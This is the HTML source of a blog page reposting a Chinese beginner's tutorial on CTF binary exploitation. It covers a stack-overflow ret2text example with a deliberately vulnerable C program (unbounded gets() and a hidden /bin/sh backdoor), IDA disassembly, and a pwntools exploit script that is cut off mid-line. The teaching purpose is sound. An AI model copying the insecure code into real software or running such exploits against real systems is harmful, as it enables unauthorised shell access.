@@ -1,0 +1,228 @@
+<!doctype html>
+<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Pwn从入门到入狱 - 神社的储物间</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="神社的储物间"><meta name="msapplication-TileImage" content="/img/favicon.ico"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="神社的储物间"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="转载，XDU巨佬写的入?指南（"><meta property="og:type" content="blog"><meta property="og:title" content="Pwn从入门到入狱"><meta property="og:url" content="https://xeonds.github.io/2021/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/Pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1/"><meta property="og:site_name" content="神社的储物间"><meta property="og:description" content="转载，XDU巨佬写的入?指南（"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://i.loli.net/2020/09/19/VrEYoaTgXHztuek.png"><meta property="og:image" content="https://i.loli.net/2020/09/19/3V8ZP2kTlwjBArp.png"><meta property="og:image" content="https://i.loli.net/2020/09/10/ImU7JcHr9j5DOS8.png"><meta property="og:image" content="https://i.loli.net/2020/09/19/PnyOMxVuwl2HkAp.png"><meta property="og:image" content="https://i.loli.net/2020/09/19/X9EqLPcvoRU7apQ.png"><meta property="og:image" content="https://i.loli.net/2020/09/19/fi49QwLhvb8jBKp.png"><meta property="og:image" content="https://i.loli.net/2020/09/10/PKn45uGFCiALw9s.png"><meta property="og:image" content="https://i.loli.net/2020/09/10/H3pmFvzSZjVbR9A.png"><meta property="og:image" content="https://i.loli.net/2020/09/08/U7P6A1HlfkZGsXi.png"><meta property="og:image" content="https://i.loli.net/2020/09/10/rpSL6osNhMKiY9u.png"><meta property="og:image" content="https://i.loli.net/2020/09/19/1A5cH3GkKp6uYsb.png"><meta property="og:image" content="https://i.loli.net/2020/09/10/7SCLieKoarEXu5m.png"><meta property="og:image" content="https://i.loli.net/2020/09/10/re1Z5dROXLE8PHp.png"><meta property="og:image" content="https://i.loli.net/2020/09/10/EPZ2iyr5UnQsgex.png"><meta property="og:image" content="https://i.loli.net/2020/09/10/nM84Expy1KVLGc6.png"><meta property="og:image" content="https://i.loli.net/2020/09/10/6Nt9GE1BWZ5ij2R.png"><meta property="og:image" content="https://i.loli.net/2020/09/10/wg6HRpMc9mLdaBU.png"><meta property="og:image" content="https://i.loli.net/2020/09/19/gaKMp2WFLs8coRJ.png"><meta property="article:published_time" content="2021-07-08T10:31:16.000Z"><meta property="article:modified_time" content="2023-05-23T14:50:29.992Z"><meta property="article:author" content="xeonds"><meta property="article:tag" content="Pwn"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://i.loli.net/2020/09/19/VrEYoaTgXHztuek.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://xeonds.github.io/2021/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/Pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1/"},"headline":"Pwn从入门到入狱","image":["https://i.loli.net/2020/09/19/VrEYoaTgXHztuek.png","https://i.loli.net/2020/09/19/3V8ZP2kTlwjBArp.png","https://i.loli.net/2020/09/10/ImU7JcHr9j5DOS8.png","https://i.loli.net/2020/09/19/PnyOMxVuwl2HkAp.png","https://i.loli.net/2020/09/19/X9EqLPcvoRU7apQ.png","https://i.loli.net/2020/09/19/fi49QwLhvb8jBKp.png","https://i.loli.net/2020/09/10/PKn45uGFCiALw9s.png","https://i.loli.net/2020/09/10/H3pmFvzSZjVbR9A.png","https://i.loli.net/2020/09/08/U7P6A1HlfkZGsXi.png","https://i.loli.net/2020/09/10/rpSL6osNhMKiY9u.png","https://i.loli.net/2020/09/19/1A5cH3GkKp6uYsb.png","https://i.loli.net/2020/09/10/7SCLieKoarEXu5m.png","https://i.loli.net/2020/09/10/re1Z5dROXLE8PHp.png","https://i.loli.net/2020/09/10/EPZ2iyr5UnQsgex.png","https://i.loli.net/2020/09/10/nM84Expy1KVLGc6.png","https://i.loli.net/2020/09/10/6Nt9GE1BWZ5ij2R.png","https://i.loli.net/2020/09/10/wg6HRpMc9mLdaBU.png","https://i.loli.net/2020/09/19/gaKMp2WFLs8coRJ.png"],"datePublished":"2021-07-08T10:31:16.000Z","dateModified":"2023-05-23T14:50:29.992Z","author":{"@type":"Person","name":"XDU"},"publisher":{"@type":"Organization","name":"神社的储物间","logo":{"@type":"ImageObject","url":"https://xeonds.github.io/img/favicon.ico"}},"description":"转载，XDU巨佬写的入?指南（"}</script><link rel="canonical" href="https://xeonds.github.io/2021/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/Pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1/"><link rel="alternate" href="/atom.xml" title="神社的储物间" type="application/atom+xml"><link rel="icon" href="/img/favicon.ico"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Oxanium:wght@300;400;600&amp;family=Roboto+Mono"><link rel="stylesheet" href="/css/cyberpunk.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><script>var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?59fd9f709f6626bf608f0b08415e0283";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();</script><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
+  (function () {
+      function switchTab() {
+          if (!location.hash) {
+            return;
+          }
+
+          const $tabMenu = document.querySelector(`a[href="${location.hash}"]`);
+          if (!$tabMenu) {
+            return;
+          }
+
+          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
+          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
+          Array.from($tabMenuContainer.querySelectorAll('a'))
+              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
+              .forEach($content => $content.classList.add('is-hidden'));
+
+          if ($tabMenu) {
+              $tabMenu.parentElement.classList.add('is-active');
+          }
+          const $activeTab = document.querySelector(location.hash);
+          if ($activeTab) {
+              $activeTab.classList.remove('is-hidden');
+          }
+      }
+      switchTab();
+      window.addEventListener('hashchange', switchTab, false);
+  })();
+  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/favicon.ico" alt="神社的储物间" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archive</a><a class="navbar-item" href="/categories">Category</a><a class="navbar-item" href="/links">Link</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="My GitHub" href="https://github.com/xeonds"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-07-08T10:31:16.000Z" title="7/8/2021, 10:31:16 AM">2021-07-08</time>发表</span><span class="level-item"><time dateTime="2023-05-23T14:50:29.992Z" title="5/23/2023, 2:50:29 PM">2023-05-23</time>更新</span><span class="level-item"> XDU </span><span class="level-item"><a class="link-muted" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/">计算机科学</a></span><span class="level-item">25 分钟读完 (大约3778个字)</span><span class="level-item" id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span>次访问</span></div></div><h1 class="title is-3 is-size-4-mobile">Pwn从入门到入狱</h1><div class="content"><h1 id="Pwn从入门到入狱"><a href="#Pwn从入门到入狱" class="headerlink" title="Pwn从入门到入狱"></a>Pwn从入门到入狱</h1><p>Copyright © 2020 arttnba3,XDSEC</p>
+<h2 id="简介：什么是Pwn？"><a href="#简介：什么是Pwn？" class="headerlink" title="简介：什么是Pwn？"></a>简介：什么是Pwn？</h2><p><strong>Pwn</strong>这个词本身其实是一个拟声词，最初来源于黑客们设想中的完全获取一台设备的控制权后便会发出“砰”的一声，Pwn因此而得名，即<strong>利用挖掘到的二进制漏洞对设备或系统发起攻击，并最终拿到shell（获取控制权）</strong></p>
+<p>Pwn也是最能代表<strong>原教旨主义黑客</strong>的一个安全研究方向<del>同时也是最容易进监狱的一个方向</del></p>
+<h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><p>作为二进制安全的分支之一，Pwn需要你<strong>熟练掌握</strong>如下基础知识：</p>
+<ul>
+<li><strong>主流平台汇编语言，包括但不局限于X86、MIPS等</strong></li>
+<li><strong>C语言</strong></li>
+<li><strong>计算机组成原理</strong></li>
+<li><strong>计算机操作系统</strong></li>
+<li><strong>静态分析（IDA）&amp;动态调试（GDB）</strong></li>
+<li><strong>Python</strong></li>
+<li><strong>编译原理</strong></li>
+<li><strong>……</strong></li>
+</ul>
+<p>看完你可能会感觉有一丶丶头大，不过少有人是先把计科专业本科的内容全部学完才开始学pwn的，大家都是<strong>一边比赛一边学习的</strong>，所以不用担心因为自己0基础导致无法入门的情况的发生</p>
+<blockquote>
+<p>CTF TO LEARN, NOT LEARN TO CTF</p>
+</blockquote>
+<h2 id="Pwn的解题过程？"><a href="#Pwn的解题过程？" class="headerlink" title="Pwn的解题过程？"></a>Pwn的解题过程？</h2><ol>
+<li>题目的二进制文件一般会被部署到服务器上，使用<code>nc xx.xx.xx.xx(ip) xxxx(端口)</code>命令可以与服务器进行交互。并且该二进制文件的副本（与服务器上的完全相同或者基本相同）将作为附件形式被提供给选手下载。</li>
+<li>你需要逆向分析二进制文件副本中存在的可利用漏洞，针对其编写<code>Exploit</code>(漏洞利用脚本)，然后向服务器发起攻击，拿到服务器上保存的<code>flag文件或字符串</code>，将其提交至本平台。</li>
+<li>注意命令行中的<code>nc</code>并不是做题工具，你需要在Linux下安装<code>pwntools</code>库（或者其它），用于编写可用性较高的<code>Exploit</code>。至于如何安装，如何使用，就需要聪明的你发挥自己的学习能力啦~</li>
+</ol>
+<h2 id="0基础入门：新人的第一个安全漏洞的利用——栈溢出——ret2text"><a href="#0基础入门：新人的第一个安全漏洞的利用——栈溢出——ret2text" class="headerlink" title="0基础入门：新人的第一个安全漏洞的利用——栈溢出——ret2text"></a>0基础入门：新人的第一个安全漏洞的利用——栈溢出——ret2text</h2><blockquote>
+<h4 id="前置知识要求"><a href="#前置知识要求" class="headerlink" title="前置知识要求"></a>前置知识要求</h4><ul>
+<li>C语言基本语法</li>
+<li>Python语言基本语法</li>
+</ul>
+<p>能大致看得懂C程序、有写简单的Python程序的能力即可</p>
+<h4 id="前置环境要求"><a href="#前置环境要求" class="headerlink" title="前置环境要求"></a>前置环境要求</h4><ul>
+<li><p>Windows</p>
+</li>
+<li><p>Linux</p>
+</li>
+</ul>
+<p>我们的一部分工作需要在Windows上完成，另一部份工作则需要在Linux中完成</p>
+<p>你可以在windows上运行Linux虚拟机，也可以直接在真机运行linux</p>
+<p>注：linux环境下由于默认的远程软件库是国外的源，下载速度可能会比较慢</p>
+<h4 id="百度“Linux-换源”与“pip-换源”更换Linux下的软件源为国内的软件源，提高下载速度"><a href="#百度“Linux-换源”与“pip-换源”更换Linux下的软件源为国内的软件源，提高下载速度" class="headerlink" title="百度“Linux 换源”与“pip 换源”更换Linux下的软件源为国内的软件源，提高下载速度"></a>百度“Linux 换源”与“pip 换源”更换Linux下的软件源为国内的软件源，提高下载速度</h4><h4 id="不同的Linux发行版本（如Ubuntu、Kali、manjaro等）请自行将搜索框内的“linux”换为对应的发行版名称"><a href="#不同的Linux发行版本（如Ubuntu、Kali、manjaro等）请自行将搜索框内的“linux”换为对应的发行版名称" class="headerlink" title="不同的Linux发行版本（如Ubuntu、Kali、manjaro等）请自行将搜索框内的“linux”换为对应的发行版名称"></a>不同的Linux发行版本（如Ubuntu、Kali、manjaro等）请自行将搜索框内的“linux”换为对应的发行版名称</h4></blockquote>
+<p>以下内容将通过几个样例简单地帮助你入门Pwn</p>
+<h3 id="以下内容操作环境位于Linux"><a href="#以下内容操作环境位于Linux" class="headerlink" title="以下内容操作环境位于Linux"></a>以下内容操作环境位于Linux</h3><p>我们现在来看这样的一个程序：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">backdoor</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;tell me your name plz:&quot;</span>);</span><br><span class="line">    <span class="built_in">gets</span>(str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">func</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们使用<code>-fno-stack-protector</code>、<code>-z norelro</code>、<code>-z execstack</code>、<code>-no-pie</code>这四条编译指令把这个程序的保护都给关掉</p>
+<p><img src="https://i.loli.net/2020/09/19/VrEYoaTgXHztuek.png" alt="image.png"></p>
+<h4 id="安全检查：checksec"><a href="#安全检查：checksec" class="headerlink" title="安全检查：checksec"></a>安全检查：checksec</h4><p><strong>使用<code>checksec</code>指令可以查看程序的保护开启情况</strong></p>
+<p><img src="https://i.loli.net/2020/09/19/3V8ZP2kTlwjBArp.png" alt="image.png"></p>
+<p>可以在控制台输入如下指令安装：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install checksec</span><br></pre></td></tr></table></figure>
+
+<h4 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h4><p>这个程序做了些什么？</p>
+<ul>
+<li><p>定义了一个后门函数<code>backdoor()</code>，但是并未调用</p>
+</li>
+<li><p>分配了20个字节大小的内存空间给到char类型数组str</p>
+</li>
+<li><p>使用<code>gets()</code>函数从标准输入流读入字符串并写入数组str内</p>
+</li>
+</ul>
+<p>我们可以看到当我们在编译时编译器<strong>给了一个警告</strong>，这是因为<strong>gets()函数并未限制读入的字符的数量，若是用户输入超过20个字符的数据，则会发生栈溢出，轻则会使程序崩溃，重则可能让不法分子获取系统的最高权限</strong></p>
+<p>我们尝试着输入超过20个字节的字符串，看看会发生些什么：</p>
+<p><img src="https://i.loli.net/2020/09/10/ImU7JcHr9j5DOS8.png" alt="image.png"></p>
+<p>程序崩溃，提示<strong>Segmentation fault</strong>（<strong>段错误</strong>），即<strong>该程序尝试访问了不属于他的内存空间</strong></p>
+<p>但是我们的程序执行流程明明很常规，代码里也没有任何的奇怪的操作，<strong>为什么输入不一样就会导致程序崩溃呢？</strong></p>
+<h3 id="以下内容操作环境位于Windows"><a href="#以下内容操作环境位于Windows" class="headerlink" title="以下内容操作环境位于Windows"></a>以下内容操作环境位于Windows</h3><h4 id="IDA：逆向分析"><a href="#IDA：逆向分析" class="headerlink" title="IDA：逆向分析"></a>IDA：逆向分析</h4><p>通常情况下，我们所拿到的都是软件的发行版，而不是源代码，我们无法直接看出漏洞存在于哪个地方，故我们需要一个工具来尽可能地还原整个程序的运行过程，这就要借助到一个工具——<strong>IDA</strong></p>
+<p>我们尝试使用<strong>IDA</strong>对程序进行<strong>逆向分析</strong></p>
+<blockquote>
+<p>注：IDA软件本体在moeCTF 2020群内有下载，你也可以选择通过搜索引擎获取一个IDA，或者直接在官网购买正版IDA</p>
+</blockquote>
+<p>当我们将程序拖入IDA后，除了我们自己写的<code>backdoor()</code>函数、<code>func()</code>函数及<code>main()</code>函数之外，我们可以看到IDA还解析出来很多奇奇怪怪的函数，</p>
+<p><img src="https://i.loli.net/2020/09/19/PnyOMxVuwl2HkAp.png" alt="image.png"></p>
+<p>这些预料之外的函数我们目前暂时不需要管（以后会学到的），我们目前只需要分析程序的主逻辑函数即可，双击main函数，我们便可以看到反汇编得到的汇编代码</p>
+<p><img src="https://i.loli.net/2020/09/19/X9EqLPcvoRU7apQ.png" alt="image.png"></p>
+<p>同样地，双击func函数我们也可以看到其原始的汇编代码</p>
+<p><img src="https://i.loli.net/2020/09/19/fi49QwLhvb8jBKp.png" alt="image.png"></p>
+<blockquote>
+<h3 id="F5键：使用IDA进行逆向分析的神器"><a href="#F5键：使用IDA进行逆向分析的神器" class="headerlink" title="F5键：使用IDA进行逆向分析的神器"></a>F5键：使用IDA进行逆向分析的神器</h3><p>当我们选中一个函数时，我们可以按下F5键，将汇编代码反编译为C语言的代码，使我们能够更好的分析程序执行流程</p>
+<p><img src="https://i.loli.net/2020/09/10/PKn45uGFCiALw9s.png" alt="image.png"></p>
+<p>要注意的是<strong>不要完全依赖于F5键进行逆向分析，反编译出来的C语言代码不一定准确、易读，汇编代码的审计与程序的动态调试同样重要</strong></p>
+<p>如：纯汇编编写的程序反编译出来的代码不知所云的情况常常出现</p>
+<p><img src="https://i.loli.net/2020/09/10/H3pmFvzSZjVbR9A.png" alt="image.png"></p>
+<p>如：C++程序很多时候逆出来就是一坨shit，没有强大的代码功底你很难搞明白程序究竟做了些什么，如下图（注释是我以前做这道题的时候手动打上的，可能有错，别深究Or2）</p>
+<p><img src="https://i.loli.net/2020/09/08/U7P6A1HlfkZGsXi.png" alt="image.png"></p>
+</blockquote>
+<p>push是什么？mov是什么？retn又是什么？他们都做了些什么？或许目前对于你而言这是完全陌生的一些东西，不过随着逐步深入的学习，你将会逐渐了解到其含义与作用</p>
+<h3 id="以下内容操作环境位于Linux-1"><a href="#以下内容操作环境位于Linux-1" class="headerlink" title="以下内容操作环境位于Linux"></a>以下内容操作环境位于Linux</h3><h4 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h4><p>为什么这个程序的汇编代码长这个样子？这就涉及到C函数调用的一个比较重要的概念——<strong>栈帧</strong>（<strong>Stack Frame</strong>）</p>
+<blockquote>
+<p>推荐阅读——《程序员的自我修养》第10章</p>
+</blockquote>
+<blockquote>
+<p>在讲栈帧之前，我们先简单地讲一讲什么是<strong>栈</strong></p>
+<p>在数据结构中，<strong>栈</strong>（<strong>stack</strong>）是一种受限线性表，在线性表上插入与删除数据的操作都只能在数据表的一端——栈顶进行操作，因此栈也是一种LIFO表（Last-in-First-out）</p>
+<p>在操作系统中，对动态内存的规划与使用是与数据结构中的栈相似的，我们称之为“栈内存”，用以存储函数内部（包括main函数）的局部变量和方法调用和函数参数值；栈内存是由系统自动分配的，一般速度较快；存储地址是连续且存在有限栈容量，会出现溢出现象程序可以将数据压入栈中，也可以将数据从栈顶弹出。压栈操作使得栈增大，而弹出操作使栈减小。 栈用于维护函数调用的上下文，离开了栈函数调用就没法实现。</p>
+</blockquote>
+<p>当程序每次进行函数调用的时候，都会在调用栈上维护一个独立的<strong>栈帧</strong>，用以储存属于这个函数的数据与基本信息，包括如下信息：</p>
+<ul>
+<li><strong>函数的返回地址和参数</strong></li>
+<li><strong>临时变量: 包括函数的非静态局部变量以及编译器自动生成的其他临时变量</strong></li>
+</ul>
+<p>想象如下一个空的栈：</p>
+<p><strong>需要注意的是：在内存当中，栈是由高地址向低地址方向增长的</strong></p>
+<p><img src="https://i.loli.net/2020/09/10/rpSL6osNhMKiY9u.png" alt="64E3FCC73EF02703BA8C857A91F96838.png"></p>
+<p>这里引入一个新的概念——<strong>栈指针寄存器SP</strong>（<strong>Stack Pointer</strong>）与<strong>帧指针寄存器BP</strong>（<strong>Frame Pointer</strong>），这两个寄存器用以管理栈帧，其中<strong>SP寄存器永远指向栈顶，BP寄存器用以进行对栈内数据的访问</strong></p>
+<p>当我们要调用一个函数时，首先会先<strong>将下一条的地址压入栈中，作为返回地址，这一步在原函数内完成</strong>，当函数执行流程结束后，程序会通过这个返回地址返回到该函数的上一层的调用地址</p>
+<p>我们还是以刚刚反汇编出来的代码进行分析：</p>
+<p>右键菜单可以切换到文本模式，也可以切换回图标格式，文本模式方便我们得以一窥程序原貌，图标模式则方便我们理解函数内的逻辑</p>
+<p><img src="https://i.loli.net/2020/09/19/1A5cH3GkKp6uYsb.png" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040055A ; Attributes: bp-based frame</span><br><span class="line">.text:000000000040055A</span><br><span class="line">.text:000000000040055A                 public func</span><br><span class="line">.text:000000000040055A func            proc near               ; CODE XREF: main+4↓p</span><br><span class="line">.text:000000000040055A</span><br><span class="line">.text:000000000040055A var_20          = byte ptr -20h</span><br><span class="line">.text:000000000040055A</span><br><span class="line">.text:000000000040055A ; __unwind &#123;</span><br><span class="line">.text:000000000040055A                 push    rbp</span><br><span class="line">.text:000000000040055B                 mov     rbp, rsp</span><br><span class="line">.text:000000000040055E                 sub     rsp, 20h</span><br><span class="line">.text:0000000000400562                 lea     rdi, s          ; &quot;tell me your name plz&quot;</span><br><span class="line">.text:0000000000400569                 call    _puts</span><br><span class="line">.text:000000000040056E                 lea     rax, [rbp+var_20]</span><br><span class="line">.text:0000000000400572                 mov     rdi, rax</span><br><span class="line">.text:0000000000400575                 mov     eax, 0</span><br><span class="line">.text:000000000040057A                 call    _gets</span><br><span class="line">.text:000000000040057F                 nop</span><br><span class="line">.text:0000000000400580                 leave</span><br><span class="line">.text:0000000000400581                 retn</span><br><span class="line">.text:0000000000400581 ; &#125; // starts at 40055A</span><br><span class="line">.text:0000000000400581 func            endp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/09/10/7SCLieKoarEXu5m.png" alt="52DF40089C8FCCF9D5CF8DE7211B73D8.png"></p>
+<p>接下来就来到了我们看到的前两行汇编代码：<code>push rbp</code>与<code>mov rbp, rsp</code>，我们不难从指令的英文释义上知道其流程：</p>
+<ul>
+<li><strong>将bp寄存器的值压入栈中</strong></li>
+<li><strong>将sp寄存器的值赋给bp寄存器</strong></li>
+</ul>
+<p><img src="https://i.loli.net/2020/09/10/re1Z5dROXLE8PHp.png" alt="9CF0F7F5A8DA1972F88EF480E4FB6271.png"></p>
+<p>接下来的<code>sub rsp, 20h</code>指令的作用是<strong>开辟栈空间</strong>，处在sp与bp之间的这一块区域便用于储存数据</p>
+<p><img src="https://i.loli.net/2020/09/10/EPZ2iyr5UnQsgex.png" alt="A422C008B65723152D16FDDAD8421B38.png"></p>
+<p>我们的<code>char str[20];</code>所占用的空间也在这里，同时我们可以发现我们<strong>虽然只分配了20个字节给str，但是程序却开辟了0x20个字节的数据，这是因为程序还要储存一些其他的数据</strong>（以后会学到）</p>
+<p><img src="https://i.loli.net/2020/09/10/nM84Expy1KVLGc6.png" alt="227643CB6A805274DA147132CC0413DE.png"></p>
+<p>那么接下来就进入到我们对<code>gets()</code>函数的漏洞的利用过程了，由于其不限制我们输入的字符串的长度，我们可以<strong>将返回地址前面的数据全部填充</strong>（<strong>padding</strong>）<strong>掉，并将返回地址覆写为别的地址，改变程序的执行流程</strong></p>
+<p><img src="https://i.loli.net/2020/09/10/6Nt9GE1BWZ5ij2R.png" alt="AF0BBCCF20D852033C201460B566F5DA.png"></p>
+<p>我们最终的目的是<strong>获取到shell</strong>，那么只要程序当中存在着<code>system(&quot;/bin/sh&quot;)</code>的函数调用，我们再将程序返回到其地址上，即可get shell</p>
+<p>构造payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>) + p64(sys_addr)  <span class="comment"># 别忘了8字节的rbp哟</span></span><br></pre></td></tr></table></figure>
+
+<p>我们之前在程序当中写了一个<code>backdoor()</code>函数，其中包含有能够getshell的语句，同时我们在IDA中可以看到其地址为<code>0x400547</code></p>
+<p><img src="https://i.loli.net/2020/09/10/wg6HRpMc9mLdaBU.png" alt="image.png"></p>
+<h4 id="攻击神器：pwntools"><a href="#攻击神器：pwntools" class="headerlink" title="攻击神器：pwntools"></a>攻击神器：pwntools</h4><p>接下来我们就需要考虑到如何将我们所构思出来的payload给输入到程序中了，那么这里我们就要用到一个对于每一位Pwner都十分重要的python库——<strong>pwntools</strong></p>
+<blockquote>
+<p>pwntools需要在<strong>Linux</strong>系统下使用（如Ubuntu、manjaro、kali等）</p>
+<p>在shell中输入如下指令安装pwntools</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo pip install pwntools</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>使用pwntools库我们可以很方便地输入相应的payload</p>
+<p>接下来我们就该开始构造我们用以get shell的脚本了，利用pwntools库，构造exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *    <span class="comment"># 从pwntools库中导入所需要的一切</span></span><br><span class="line">p = process(<span class="string">&#x27;./test&#x27;</span>)   <span class="comment"># 运行一个程序</span></span><br><span class="line">        <span class="comment"># 需要注意的是，在连接远程服务器的时候，使用的是remote()</span></span><br><span class="line">           <span class="comment"># p = remote(addr,port)</span></span><br><span class="line">              <span class="comment"># 如：p = remote(&#x27;sec.arttnba3.cn&#x27;,10001)</span></span><br><span class="line">p.recv()      <span class="comment"># 从程序中读取输入直到下一个断点（如遇到输入语句）</span></span><br><span class="line">sys_addr = p64(<span class="number">0x400547</span>)  <span class="comment"># 将地址构造为符合小端模式的bytes数组，长度为8</span></span><br><span class="line">        <span class="comment"># 需要注意的是在32位下应当使用p32()，长度为4</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x28</span> + sys_addr <span class="comment"># 构造我们的payload</span></span><br><span class="line">p.sendline(payload)    <span class="comment"># 向程序发送我们的输入</span></span><br><span class="line">        <span class="comment"># 需要注意的是，sendline()会在末尾添加换行符&#x27;\n&#x27;</span></span><br><span class="line">           <span 